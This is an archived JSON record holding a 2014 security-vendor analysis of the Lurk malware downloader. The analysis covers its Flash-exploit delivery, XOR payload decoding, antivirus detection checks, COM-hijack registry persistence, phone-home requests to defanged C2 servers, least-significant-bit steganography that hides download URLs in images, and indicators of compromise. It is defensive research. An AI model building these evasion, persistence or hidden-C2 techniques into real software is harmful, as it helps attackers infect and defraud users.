{
    "id": "5d3958e5-9b29-4859-ba20-805c3b7763ca",
    "created_at": "2023-01-12T15:09:43.551007Z",
    "updated_at": "2025-03-27T02:16:39.992725Z",
    "deleted_at": null,
    "sha1_hash": "cdc90bd2d3f4136343bed7a92196cdfc3d05b2ee",
    "title": "2014-08-07 - Malware Analysis of the Lurk Downloader",
    "authors": "",
    "file_creation_date": "2022-05-28T19:56:47Z",
    "file_modification_date": "2022-05-28T19:56:47Z",
    "file_size": 376313,
    "plain_text": "# Malware Analysis of the Lurk Downloader\n\n**secureworks.com/research/malware-analysis-of-the-lurk-downloader**\n\nDell SecureWorks Counter Threat Unit™ Threat Intelligence, Brett Stone-Gross\n\nThursday, August 7, 2014 By: Dell SecureWorks Counter Threat Unit™ Threat Intelligence\n\n**Author: Brett Stone-Gross, Ph.D., Dell SecureWorks Counter Threat Unit**\n**Date: 7 August 2014**\n\n**Overview**\n\nLurk is a malware downloader that uses digital steganography: the art of hiding secret information within a\ndigital format, such as an image, audio, or video file. Lurk specifically uses an algorithm that can embed\nencrypted URLs into an image file by inconspicuously manipulating individual pixels. The resulting image\ncontains additional data that is virtually invisible to an observer. Lurk's primary purpose is to download and\nexecute secondary malware payloads. In particular, the Dell SecureWorks Counter Threat Unit™ (CTU)\nresearch team has observed Lurk dropping malware used to commit click fraud.\n\nSome malware families, notably the KINS banking trojan (which is based on leaked Zeus source code and is\nalso known as ZeusVM), have incorporated non-digital steganographic techniques. The most commonly used\n[method simply appends data (such as a configuration file or a command) to the end of an image file. These](http://blog.malwarebytes.org/security-threat/2014/02/hiding-in-plain-sight-a-story-about-a-sneaky-banking-trojan/)\nmodifications are relatively easy to detect by a commercially available intrusion prevention system (IPS) or\nintrusion detection system (IDS). In contrast, it is unlikely that existing IPS/IDS devices could detect data that is\nconcealed with digital steganography. As a result, Lurk may be able to evade network defenses and hide in\nplain sight.\n\n**Malware distribution**\n\n[Distribution of the Lurk malware was first described in February 2014 by a security researcher known as](http://malware.dontneedcoffee.com/2014/02/cve-2013-5330-flash-in-unknown-exploit.html)\nKafeine. At the time, Lurk was being propagated through an HTML iFrame on compromised websites that\n[loaded a Flash-based exploit for CVE-2013-5330. If a person visiting one of these websites was running a](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5330)\nvulnerable version of Adobe Flash, the exploit dropped a DLL file and executed the Lurk malware. When CTU\nresearchers began investigating Lurk, they found very little published information about the malware's behavior,\noperation, and function. This lack of information may be due to Lurk's unconventional implementation and use\nof digital steganography.\n\n**Lurk dropper**\n\nLurk consists of two components: a dropper DLL and a payload DLL. The dropper DLL’s main purpose is to\nextract and load the payload DLL. As shown in Figure 1, the Lurk dropper DLL contains several exports that\nappear to be legitimate, but in fact lead to garbage code designed to mislead antivirus products and security\nresearchers. Lurk's real dropper code is contained in the DLLMain function. In some Lurk samples, the\nmalware payload is embedded as data in the resource section. The extraction code begins by deriving an XOR\nkey that is used to decrypt the payload DLL. The key is obtained by performing an XOR operation on a hardcoded value of length N with the first N bytes of the embedded data. After deriving the key, the malware\npayload is decoded by performing another XOR operation on each byte of data from offset N with each byte of\nthe XOR key.\n\n\n-----\n\n_Figure 1. The export table from a Lurk sample. (Source: Dell SecureWorks)_\n\nSome Lurk variants load a bitmap image from the resource section of the dropper DLL. Figure 2 shows two\nbitmap images from the resource section of Lurk samples. The seemingly random noise in the right-half of the\nimages is the actual malware code that is extracted by calling several Windows graphics API functions.\n\n_Figure 2. Primary Lurk DLL malware code embedded in two bitmap images. (Source: Dell SecureWorks)_\n\n**Behavior**\n\nAfter the main Lurk payload DLL executes, it checks the infected system for the installation of 52 different\nsecurity products (see Table 1) by searching the registry for keys under HKEY_LOCAL_MACHINE\\Software\nand HKEY_CURRENT_USER\\Software. If Lurk detects any of the 21 products indicated in bold italics, it does\nnot install itself on the infected system. If the check does not reveal any of the 21 products, Lurk adds the\ndetected products to an integer array list that is sent to the command and control (C2) server.\n\nMcAfee Zone Labs **Symantec** FRISK Software\n\n\nAVG Microsoft\\OneCare\nProtection\n\nSymantec\\PatchInst\\NIS Microsoft\\Microsoft\nAntimalware\n\n\n**Classes\\CLSID\\**\n**{D5507020-DB45-**\n**11d1-A5F0-**\n**00600872F78D}**\n\n\n**HAURI\\ViRobot** Classes\\*\\shellex\\ContextMenuHandlers\\\nTrustPortAntivirusMenuHandler\n\n\nSophos\n\n\n**MicroWorld** **K7 Computing** GFI Software\\VIPRE\nInternet Security\n\n\n**Kingsoft**\n\n\n**PCSI** **Antiy Labs** rising Panda Software\n\nEmsi Software GmbH Hacksoft ComodoGroup **G DATA**\n\n\n-----\n\nWRData Safer Networking\nLimited\n\nKasperskyLab **ALWIL**\n**Software\\Avast**\n\n\nJiangMin PCTools\n\nAhnlab Virusbuster\n\n\n**Quick Heal** TrendMicro **Microsoft\\Windows**\n**Defender**\n\n\nIkarus\n\n**Bullguard Ltd.**\n\n\n**Immunet Protect** **Malwarebytes'**\n**Anti-Malware**\n\n\nEmsi Software\nGmbH\n\n\nArcaBit **AVAST Software** ESET **Avira**\n\n**BitDefender** Doctor Web CA **Vba32**\n\n\nAuthentium Data Fellows\\FSecure\n\n\n**SBAMSvc** Central Command\n\n\n_Table 1. Security products checked by Lurk. (Source: Dell SecureWorks)_\n\nLurk installs itself on the infected system by copying itself to a temporary directory via the GetTempPathA\nWindows API function. It uses a filename assigned by GetTempFileNameA appended with a \".tmp\" extension.\nThe malware establishes persistence by creating the registry key: HKEY_CURRENT_USER\\\nSOFTWARE\\Classes\\CLSID\\{A3CCEDF7-2DE2-11D0-86F4-00A0C913F750}\\InProcServer32, with the default\nvalue set to the path of the Lurk DLL in the temporary directory and the ThreadingModel value set to \"both.\"\nThe registry keys ensure that Lurk's DLL will be loaded into the process space of the COM client executable\nspecified by the CLSID \"A3CCEDF7-2DE2-11D0-86F4-00A0C913F750,\" which corresponds to Internet\nExplorer's PNG plugin image decoder. This is important because Lurk will only run in the context of Internet\nExplorer (iexplore.exe) or Firefox (firefox.exe).\n\n**Phone home**\n\nLurk is heavily obfuscated and uses several custom algorithms to encrypt strings for its C2 servers, imports,\nregistry keys, and security products searches. After deobfuscating the C2 server strings, the URLs appear\nsimilar to the following:\n\nhxxp://wxyz.alphaeffects.net/lolo/\nhxxp://wxyz.mesjunio.com/lolo/\nhxxp://95.211.169.162/lolo/\n\nThe malware then appends the five parameters listed in Figure 3 to the path. The first parameter is a hardcoded value that appears relatively consistently across samples as 30 or 31, which may indicate the malware's\nversion number. The constant is followed by the volume serial number of the infected system (converted to\ndecimal), another hard-coded constant that varies across samples, and an array of integers that represents the\ninstalled security products, appended with an \".html\" extension.\n\n_Figure 3. Lurk phone-home parameters. (Source: Dell SecureWorks)_\n\nThe malware computes a unique four-character subdomain that is dependent on the volume serial number,\nwhich replaces the \"wxyz\" string in the example URLs listed earlier in this section. For the first hard-coded\ndomain (hxxp://wxyz.alphaeffects.net/lolo/ in the example), the calculation takes each byte of the volume serial\n\n\n-----\n\nnumber modulo 26 and adds the ordinal value of lowercase a to derive each character. The result is a\nlowercase letter 'a' through 'z'. For instance, the subdomain for volume serial number 0x5802a4a2 (little\nendian) is \"gick\". The second domain (hxxp://wxyz.mesjunio.com/lolo/ in the example) uses the same\nalgorithm, except '22' is added to each byte of the volume serial number. The Lurk C2 domains use wildcard\nDNS to resolve all subdomains.\n\nThe phone-home request has the following format. The User-Agent field is hard-coded and may not be a\nreliable signature because it is the default value for Internet Explorer 8 on a Windows XP system.\n```\nGET /lolo/30/1476568226/50095/000103.html\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\nHost: gick.alphaeffects.net\nCache-Control: no-cache\n\n```\nThe malware can be configured to send the phone-home request over HTTP on port 80 or over HTTPS on port\n443 to make signature-based network detection more difficult without performing an SSL man-in-the-middle\nattack. The reply from the C2 server is a bitmap image that contains a URL of where to download a malware\nexecutable. The URL is encrypted and embedded in the bitmap image using steganography.\n\n**Extracting the download URL through steganography**\n\nLurk hides the downloader URLs using a steganographic technique that embeds information in the least\nsignificant bit (LSB) of every byte. The malware embeds its data in the individual color pixels that form a bitmap\nimage. Figure 4 shows a typical Lurk bitmap file that contains an encrypted and embedded download URL in\nthe image. The tan outline is not present in the image but is shown for contrast and readability.\n\n_Figure 4. Lurk bitmap containing download URL embedded and encrypted within the image. (Source: Dell_\n_SecureWorks)_\n\nFigure 5 is the hexadecimal representation of the complete image file. The first 14 bytes of the image form the\nbitmap header:\n\nBytes 1-2 (\"BM\") (green): Bitmap signature\nBytes 2-6 (orange): File size\nBytes 6-10 (purple): Reserved\nBytes 10-14 (blue): Data offset\n\nThe next 40 bytes are the bitmap info headers. The embedded data begins at byte 0x36 (decimal 54),\nbeginning with the encoded offset (highlighted in red).\n\n\n-----\n\n_Figure 5. Lurk image data. (Source: Dell SecureWorks)_\n\n**_Extracting data from the image_**\n\nThe malware reads the first 32 bytes immediately after the bitmap header and bitmap info headers at byte\noffset 0x36. Figure 6 shows the first eight bytes of encoded data in the bitmap image at this offset.\n\n_Figure 6. First eight bytes of Lurk-encoded data contained in a bitmap image. (Source: Dell SecureWorks)_\n\nTo understand how the data is encoded, each byte can be converted into binary:\n\n0xff = 11111111\n0xfe = 11111110\n\nThe least significant bit is shown in bold. A value of 0xff is used to encode a 1, and 0xfe is used to encode a 0.\nUsing this algorithm, Lurk can encode one bit of information for every eight bits (or 1 byte) of data.\n\nTable 2 shows how the eight bytes listed in Figure 6 encode the following data:\n\n01000000 (0x40 in hexadecimal)\n\nDecoding the hidden information from the first 32 bytes results in the value 0xa40. This value is added to a\nhard-coded value of 0x76, which is then used to locate the offset of the encoded malware URL. The same\nalgorithm is then applied to extract the bytes representing the malware URL.\n\n\n-----\n\n**Byte** **1** **2** **3** **4** **5** **6** **7** **8**\n\n**MSB** 1 1 1 1 1 1 1 1\n\n1 1 1 1 1 1 1 1\n\n1 1 1 1 1 1 1 1\n\n1 1 1 1 1 1 1 1\n\n1 1 1 1 1 1 1 1\n\n1 1 1 1 1 1 1 1\n\n1 1 1 1 1 1 1 1\n\n**LSB** 0 1 0 0 0 0 0 0\n\n**Value** **0** **1** **0** **0** **0** **0** **0** **0**\n\n_Table 2. Table of binary values used to extract hidden data in Lurk bitmap images._\n\nChanging the least significant bit has a minimal impact on a pixel's color. Figure 7 shows the almost\nimperceptible difference between flipping the least significant two bits of a white pixel. The technique of\nembedding information in the least significant byte demonstrates how subtle the color changes are to individual\npixels.\n\n_Figure 7. Effect of flipping one and two bits from each color channel. The circle around the three white_\n_rectangular regions shows how the white color changes slightly as the number of bits is flipped. (Source: Dell_\n_SecureWorks)_\n\nAfter the bytes are extracted from the image, the URL is encrypted with a custom string obfuscation algorithm.\nThe following URL results from this image after extraction and decryption:\n\nhxxp://zvld.alphaeffects.net/d/1721174125.zl\n\nLurk issues an HTTP GET request to the URL specified in the bitmap image and downloads the payload. The\npayload is obfuscated using a four-byte XOR key that is hard-coded into the malware. After downloading the\npayload, Lurk creates an Internet Explorer process and injects the payload into it.\n\n**Lurk malware payloads**\n\nThreat actors could use the Lurk downloader to upload various types of malware (e.g., banking trojans,\nransomware, rogue antivirus software) onto a victim's system, but the malware payloads downloaded by Lurk\nas of this publication are used for click fraud The click-fraud malware phones home to track helpertrack com\n\n\n-----\n\nto receive a click fraud template with a request in the following format:\n```\nGET /log/<volume_serial_number>/<int>/?id=<int> HTTP/1.1\nHost: track.helpertrack.com\nConnection: Keep-Alive\n\n```\nThe reply from the C2 server is a click-fraud template that is compressed with gzip and encrypted. The clickfraud template is in JSON format and contains instructions for creating fraudulent impressions and clicks by\nloading a series of iFrames with spoofed referrers.\n\n**Threat indicators**\n\nThe threat indicators in Table 3 can be used to detect activity related to the Lurk downloader. The domains and\nIP address listed in the indicators table may contain malicious content, so consider the risks before opening\nthem in a browser.\n\nIndicator Type Context\n\ne9cab9097e7f847b388b1c27425d6e9a MD5 hash Lurk sample\n\ne9da19440fca6f0747bdee8c7985917f MD5 hash Lurk sample\n\nf5022eae8004458174c10cb80cce5317 MD5 hash Lurk sample\n\ne006469ea4b34c757fd1aa38e6bdaa72 MD5 hash Lurk sample\n\nc461706e084880a9f0409e3a6b1f1ecd MD5 hash Lurk sample\n\ne8da52e2e0622c5bcb8aa7adbdb064d8 MD5 hash Lurk sample\n\n1adceec5717679b38682e7c9ac17ec82 MD5 hash Lurk sample\n\nae23ad4c3a5e2660096874bf8306ef49 MD5 hash Lurk sample\n\n\nHKEY_CURRENT_USER\\\nSOFTWARE\\Classes\\CLSID\\\n{A3CCEDF7-2DE2-11D0-86F4-00A0C913F750}\\\nInProcServer32\n\n\nRegistry key Lurk persistence mechanism\n\n\n*.cooperatemedia.com Domain\nname\n\n*.adsoas.com Domain\nname\n\n*.mesjunio.com Domain\nname\n\n*.alphaeffects.net Domain\nname\n\ntrack.helpertrack.com Domain\nname\n\n\nC2 server\n\nC2 server\n\nC2 server\n\nC2 server\n\nC2 server (click-fraud template\nserver)\n\n\n95.211.169.162 IP address C2 server\n\n_Table 3. Threat indicators for the Lurk downloader._\n\n**Conclusion**\n\n\n-----\n\nMalware is constantly evolving to stay one step ahead of computer security researchers and law enforcement.\nThreat actors invest considerable effort into hardening their botnets, making the botnet infrastructures more\nresilient to takedown attempts (e.g., by using peer-to-peer networks) and encrypting data (sometimes via\nstrong public key cryptography) to prevent eavesdropping. A recent botnet trend as of this publication is hiding\nmalware traffic in plain sight through techniques such as HTML comment tags, text on public websites, and\nfake image files. In some instances, malware uses digital steganography to embed data into an image. The\nLurk downloader demonstrates the power and versatility of this technique and how it can be used to evade\nnetwork detection and manual scrutiny by malware researchers. Steganography can make it exceedingly\ndifficult to detect the presence of hidden information such as a configuration file, binary update, or bot\ncommand, especially in digital files. As a result, the use of steganography in malware may become more\nprevalent in the future.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2014/2014-08-07 - Malware Analysis of the Lurk Downloader.pdf"
    ],
    "report_names": [
        "2014-08-07 - Malware Analysis of the Lurk Downloader.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dcba8e2b-93e0-4d6e-a15f-5c44faebc3b1",
            "created_at": "2022-10-25T16:07:23.816991Z",
            "updated_at": "2025-03-27T02:02:09.991944Z",
            "deleted_at": null,
            "main_name": "Lurk",
            "aliases": [],
            "source_name": "ETDA:Lurk",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2864e40a-f233-4618-ac61-b03760a41cbb",
            "created_at": "2023-12-01T02:02:34.272108Z",
            "updated_at": "2025-03-27T02:02:10.209072Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "ETDA:WildCard",
            "tools": [
                "RustDown",
                "SysJoker"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "256a6a2d-e8a2-4497-b399-628a7fad4b3e",
            "created_at": "2023-11-30T02:00:07.299845Z",
            "updated_at": "2025-03-27T02:00:03.257794Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "MISPGALAXY:WildCard",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536183,
    "ts_updated_at": 1743041799,
    "ts_creation_date": 1653767807,
    "ts_modification_date": 1653767807,
    "files": {
        "pdf": "https://archive.orkl.eu/cdc90bd2d3f4136343bed7a92196cdfc3d05b2ee.pdf",
        "text": "https://archive.orkl.eu/cdc90bd2d3f4136343bed7a92196cdfc3d05b2ee.txt",
        "img": "https://archive.orkl.eu/cdc90bd2d3f4136343bed7a92196cdfc3d05b2ee.jpg"
    }
}